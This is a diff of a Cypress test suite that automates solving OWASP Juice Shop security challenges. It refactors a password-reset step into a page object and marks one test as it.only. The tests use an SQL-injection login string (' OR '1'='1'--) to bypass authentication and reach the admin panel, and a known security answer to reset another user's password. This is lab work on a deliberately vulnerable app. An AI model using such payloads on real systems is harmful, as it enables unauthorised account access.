@@ -2,6 +2,7 @@ import firstVisitPopups from '../POM/FirstVisitPopups.pom';
 import headerBar from '../POM/headerBar.pom';
 import loginPage from '../POM/loginPage.pom';
 import scoreBoard from '../POM/ScoreBoard.pom';
+import resetPassword from '../POM/resetPassword.pom'
 
 describe('OWASP JuiceShop Achivments unlocking Automation', () => {
   context('2 - stars vulnerabilities', () => {
@@ -39,9 +40,10 @@ describe('OWASP JuiceShop Achivments unlocking Automation', () => {
       scoreBoard.checkIsAchivSolvedXHR('View Basket');
     });
 
-    it('4 - Get rid of all 5-star customer feedback', () => {
+    it.only('4 - Get rid of all 5-star customer feedback', () => {
       loginPage.login("' OR '1'='1'--", " ");
       cy.visit('/#/administration');
+      cy.wait(2000)
       cy.get("div[class='customer-table'] mat-row").each((customerFeedback) => {
         if(customerFeedback.find("mat-icon").length === 5){
           customerFeedback.find("button").click();
@@ -55,12 +57,7 @@ describe('OWASP JuiceShop Achivments unlocking Automation', () => {
       const newPassword = 'newPassword123.';
       const securityAnswer = 'Daniel Boone National Forest';
       const johnEmail = 'john@juice-sh.op';
-      cy.visit('#/forgot-password');
-      cy.get("[id='email']").type(johnEmail);
-      cy.get("[id='securityAnswer']").type(securityAnswer);
-      cy.get("[id='newPassword']").type(newPassword);
-      cy.get("[id='newPasswordRepeat']").type(newPassword);
-      cy.get("[id='resetButton']").click();
+      resetPassword.resetPassword(johnEmail, newPassword, securityAnswer)
       scoreBoard.checkIsAchivSolvedXHR('Meta Geo Stalking');
     });
   });
